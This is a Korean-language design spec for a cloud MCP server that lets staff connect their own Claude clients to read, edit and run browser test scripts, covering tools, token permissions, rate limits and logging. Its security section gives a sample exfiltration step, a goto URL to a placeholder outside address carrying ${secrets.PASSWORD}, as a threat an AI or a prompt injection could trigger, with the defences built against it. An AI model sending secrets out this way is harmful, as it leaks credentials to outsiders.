---
title: SPEC - 클라우드 MCP
path:  euta-workspace / 40.설계 / SPEC - 클라우드-MCP
ref: PLAN_euta-cloud 결정 "클라우드 AI"·"MCP 연결"·"권한"(2026-10-20) · ARCH_euta-cloud · ADR-008 · ADR-009 · ADR-023
---

# SPEC - 클라우드 MCP

> 상태: **확정 · 구현 완료** (2026-10-20 확정, 2026-10-21 C5 구현 — [ADR-028](ADR_028_클라우드-MCP-구현.md)). 제안값은 2026-10-20 사용자 확인으로 모두 채택. 남은 확인: 대화형 Claude Code 로 "고치고 실행" 1회(사용자) · Desktop.
> 연결 방식의 정본은 [ARCH_euta-cloud 원격 MCP](ARCH_euta-cloud.md#원격-mcp-커넥터). 개인 토큰 규칙은 [SPEC_클라우드-계정-프로젝트](SPEC_클라우드-계정-프로젝트.md#개인-토큰-mcp).

## 목적

- 구성원이 **자기 Claude**(Claude Code · Desktop, 본인 구독)에서 euta cloud 의 클라우드 프로젝트를 읽고·고치고·실행하게 한다. 서버는 AI 를 품지 않고 도구만 제공한다.
- 로컬 앱이 없는 구성원도 AI 로 스크립트를 작성·수정할 수 있다(녹화는 로컬 앱 전용).

## 연결

| 항목 | 규칙 |
|---|---|
| 주소 | `https://<euta cloud>/mcp` — Streamable HTTP(무상태, 요청마다 새 서버 인스턴스). **사내망·VPN 전용**. `GET` 은 405(서버 → 클라이언트 독립 스트림 없음) |
| 인증 | `Authorization: Bearer euta_…`(개인 토큰)만 — 쿠키 세션·장치 토큰 불가. 없거나 무효·만료·폐기·비활성 계정이면 401 + `WWW-Authenticate: Bearer` |
| Claude Code | `claude mcp add --transport http euta-cloud https://<euta cloud>/mcp --header "Authorization: Bearer euta_…"` |
| euta-claude-plugin | **선택 — 위 `claude mcp add` 로 직접 추가**(README "euta cloud 연결") + skill `cloud-test-script`. C5 확인 결과 `.mcp.json` 의 http 서버는 `userConfig` 주소가 비면 건너뛰지 않고 `/mcp` 에 "Failed to connect" 로 늘 보여서 플러그인 기본 구성에서 뺐다(Change Log 2026-10-21) |
| Desktop | 로컬 설정 + 중계 도구 경유 가능 여부 — **미확인**(C5 에서 하지 못함, 후속) |

## 도구

> 이름·입력 모양은 기존 엔진 MCP 도구([ADR-008](ADR_008_MCP-서버-도구-설계.md))와 맞춘다. 대상이 로컬 파일·폴더가 아니라 **클라우드 프로젝트**이고, 모든 호출은 서버 권한 판정을 거친다.

| 도구 | 권한 | 내용 |
|---|---|---|
| `list_projects` | 읽기 | 볼 수 있는 프로젝트(내 역할 포함) |
| `get_project` | 읽기 | 설정 · 환경(이름·주소·변수·**테스트 계정 이름만**) · 스위트 · **테스트 규칙**. Teams webhook 주소는 역할과 관계없이 싣지 않음 |
| `list_scripts` | 읽기 | 경로 · 현재 버전 · 검증 상태 · 최근 실행 상태 |
| `read_script` | 읽기 | 원문 + 버전 id(저장 때 기준 버전으로 씀) + 단계 문장 요약 |
| `get_schema` | 읽기 | DSL JSON Schema |
| `validate_script` | 읽기 | 원문 검증(저장하지 않음) + 클라우드 사전 검사 결과 |
| `save_script` | 쓰기 | 경로 · 원문 · 기준 버전(새 파일은 없음) · 메모. 충돌이면 현재 버전 정보를 돌려줌 → 다시 읽고 고치게 함. 출처 "AI(MCP)", 작성자 = 토큰 주인 |
| `run_script` | 쓰기 | 스크립트 또는 스위트 · 환경 · vars → **실행 id 를 바로 돌려줌**(수 시간짜리가 있어 기다리지 않음) |
| `get_run` | 읽기 | 상태 · 진행 단계 · 소요 시간 · 단계별 결과 · 실패 메시지 · 지표 요약 |
| `list_runs` | 읽기 | 필터(대상·환경·상태·출처) |
| `get_screenshot` · `get_artifact` | 읽기 | 실행 결과 파일(이미지 · 텍스트 계열). 보관 기간이 지났으면 "파일 만료" |
| `cancel_run` | 쓰기 | 실행 취소 |
| `list_schedules` | 읽기 | 예약 목록 · 다음 시각 · 최근 결과 |

- **1차 제외**: 탐색형 세션 도구(`session_*` — 러너 브라우저를 오래 붙잡음) · 예약 만들기/수정 · 환경·테스트 계정·구성원 변경. 이들은 웹·앱에서만.
- 권한 판정: 토큰 권한(`읽기`/`읽기·쓰기`)과 토큰 주인의 프로젝트 역할 중 좁은 쪽. 보기 역할이면 쓰기 도구는 "권한 없음".
- 도구 결과에 테스트 계정 값은 어떤 경우에도 넣지 않는다. 스크립트 원문에는 `${secrets.NAME}` 참조만 있다.
- 호출 상한 토큰당 분당 120회 — **HTTP 요청 단위**(도구 호출 1회 = 1회, 연결 때 initialize·tools/list 도 셈). 넘으면 HTTP 429 + `Retry-After`.
- 실행 도구(`get_run` · `get_screenshot` · `get_artifact` · `cancel_run`)는 `runId` 만 받는다(프로젝트는 실행에서 찾고 권한 판정). `environment` · `suite` 는 이름 또는 id.

## 작업 로그 · 이력

- `save_script` · `run_script` · `cancel_run` 은 작업 로그에 행위자 "AI — <토큰 주인>"(토큰 이름 포함)으로 남는다. 스크립트 이력의 출처는 "AI(MCP)".

## 보안 — AI 가 테스트 계정을 바깥으로 보내는 경로

AI 는 스크립트를 쓰고 실행할 수 있으므로, 예를 들어 `goto: https://외부주소/?p=${secrets.PASSWORD}` 같은 스크립트로 테스트 계정 값을 바깥에 보낼 수 있다(프롬프트 인젝션 포함). 로컬 앱에서도 열려 있는 문제(STATE "막힘")를 클라우드 실행에서는 다음으로 막는다. **확정 (2026-10-20).**

| 규칙 | 내용 |
|---|---|
| secrets 사용 위치 | 클라우드 실행에서 `${secrets.*}` 는 **입력 스텝(`fill`·`type`)의 값에만** 허용. `goto` URL · `vars` · `expect` 등에 쓰면 사전 검사 거절 |
| 탐색 허용 도메인 | 환경마다 "허용 도메인" 목록(기본 = 환경 주소의 도메인). **secrets 가 들어간 입력 스텝은 현재 페이지가 허용 도메인일 때만** 실행, 아니면 스텝 오류. 외부 로그인(SSO)·결제 도메인은 목록에 추가 |
| 적용 범위 | 사람·AI 구분 없이 모든 클라우드 실행(규칙이 출처에 따라 달라지지 않게). **로컬 앱의 모든 실행에도 적용**(PLAN 결정 "secrets 규칙 적용 범위" 2026-10-21 — 엔진 `restrictSecrets`, [SPEC_프로젝트-관리](SPEC_프로젝트-관리.md)) |

- 엔진 변경(secrets 사용 위치 검사 · 입력 스텝 도메인 검사)은 [ARCH 엔진 보완](ARCH_euta-cloud.md#엔진-보완-dsl-spec-갱신-후-구현) · [DSL SPEC](SPEC_test-script-dsl.md) 에 반영했다(C1). 로컬 실행 적용은 엔진 `restrictSecrets` 옵션으로 구현했다([ADR-024](ADR_024_엔진-클라우드-보완.md) 결과).

## 완료 기준 (검증)

- MCP 클라이언트 스모크: 도구 목록 · 읽기 도구 · `save_script` 저장·충돌 · `run_script` → `get_run` 완료까지 · 폐기·만료 토큰 401 · 읽기 토큰의 쓰기 거절 · 보기 역할의 쓰기 거절 · 도구 결과 전부에서 테스트 계정 평문 0건.
- 실제 Claude Code 에 `claude mcp add` 로 연결해 "스크립트 고치고 실행" 1회.
- secrets 를 URL 에 쓴 스크립트 사전 검사 거절 · 허용 밖 도메인에서 secrets 입력 스텝 오류.

## Change Log

### 2026-10-23 — `get_project` 의 suites 항목에 `alwaysRun`(스크립트 id), `cancel_run` 설명에 항상 실행 예외, 스위트를 못 찾을 때 한국어 오류 문구 "테스트 세트(suite)" — [ADR-031](ADR_031_테스트-세트-구현.md)

### 2026-10-21 — C5 구현 (ADR-028) · 구현하며 달라진 점

- 전송: MCP SDK v2 `createMcpHandler` 무상태. 2025 계열 요청(Claude Code·SDK 클라이언트)의 POST 응답은 요청 단위 SSE 프레임(Streamable HTTP 의 일부 — 폐기 예정 HTTP+SSE 전송 아님). `GET /mcp` 405.
- 인증: 개인 토큰만(쿠키·장치 토큰 401). 401 에 `WWW-Authenticate: Bearer`.
- 호출 상한은 HTTP 요청 단위로 센다(기존 api-key rate limit 재사용, 같은 토큰의 REST 호출도 합산).
- 도구는 엔진 도구 핸들러를 재사용하지 않고 서버 서비스 위에 다시 정의(이름·입력 모양은 ADR-008). 실행 도구는 `runId` 만, 환경·스위트는 이름 또는 id. `get_project` 에 webhook 주소 없음.
- 플러그인: `euta-cloud` http 서버를 `.mcp.json`·`userConfig` 에 넣지 않고 `claude mcp add` 안내 + skill 로. 이유 — Claude Code 2.1.305 는 비어 있는 `userConfig` 주소의 http 서버를 건너뛰지 않고 "✘ Failed to connect — URL is unset or invalid" 로 늘 표시(클라우드를 안 쓰는 사용자에게 오류로 보임). 플러그인 설정으로 받으려면 별도 opt-in 플러그인으로 낼 수 있음(제품 판단, 미결).
- 완료 기준 중 "실제 Claude Code 에 연결" 은 `claude mcp add` + `claude mcp list` ✔ Connected 로 확인(격리 설정 폴더). 대화형 "고치고 실행" 1회는 사용자 구독 사용이라 사용자 확인으로 남김. secrets URL 사전 검사 거절은 MCP `validate_script`·`run_script` 로도 확인, 허용 밖 도메인 입력 스텝 오류는 C1·C3 엔진/러너 테스트 그대로.

### 2026-10-20 — 확정 (제안값 · 1차 제외 범위 · 보안 규칙 채택)

### 2026-10-20 — 초안
